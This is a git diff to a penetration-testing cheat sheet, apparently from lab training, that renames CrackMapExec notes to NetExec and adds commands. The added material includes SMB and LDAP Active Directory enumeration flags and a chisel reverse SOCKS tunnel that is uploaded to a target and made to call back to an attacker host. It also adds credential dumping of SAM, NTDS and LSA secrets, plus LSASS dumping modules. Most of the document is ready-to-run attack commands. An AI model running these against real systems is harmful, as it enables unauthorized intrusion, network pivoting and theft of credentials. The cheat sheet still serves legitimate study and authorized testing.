@@ -1,4 +1,4 @@
-# CrackMapExec
+# NetExec
 
 
 ```shell
@@ -23,11 +23,29 @@ netexec smb 10.129.203.121 -u '' -p ''
 # Guest session
 netexec smb 10.129.203.121 -u 'guest' -p ''
 
-# Enumerating AD details
+# Enumerating AD details smb
 --users
 --pass-pol
 --groups
 --rid-brute # IMPORTANT
+--computers
+
+# Enumerating AD details ldap
+--password-not-required
+--trusted-for-delegation
+--admin-count
+--get-sid
+--gmsa
+--nla-screenshot
+--screenshot
+--screentime SCREENTIME
+--res RES
+
+# Enumerating computer details
+--loggedon-users
+--sessions
+--disks
+--local-groups
 
 # Filtering users
 sed -i "s/'/\"/g" users.txt
@@ -119,4 +137,38 @@ netexec mssql 10.129.204.177 -u user -p password -M mssql_priv -o ACTION=rollbac
 # Put and download files
 --put-file /etc/passwd C:/Users/Public/passwd
 --get-file C:/Windows/System32/drivers/etc/hosts hosts
+```
+
+- Proxy
+
+```shell
+# Server
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
+gunzip -d chisel.gz
+chmod +x chisel
+./chisel server --reverse
+
+# Proxychains config
+socks5  127.0.0.1 1080
+
+# Client
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
+gunzip -d chisel.exe.gz
+netexec smb 10.129.204.133 -u user -p password --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
+netexec smb 10.129.204.133 -u user -p password -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
+netexec smb 10.129.204.133 -u user -p password -X "Stop-Process -Name chisel -Force"
+```
+
+- Credentials dumping
+
+```shell
+netexec smb 10.129.204.133 -u user -p password --sam
+netexec smb 10.129.204.133 -u user -p password --ntds --user name
+netexec smb 10.129.204.133 -u user -p password --ntds --enabled
+netexec smb 10.129.204.133 -u user -p password --lsa
+
+netexec smb 10.129.204.133 -u user -p password -M lsassy
+netexec smb 10.129.204.133 -u user -p password -M procdump
+netexec smb 10.129.204.133 -u user -p password -M handlekatz
+netexec smb 10.129.204.133 -u user -p password -M nanodump
 ```
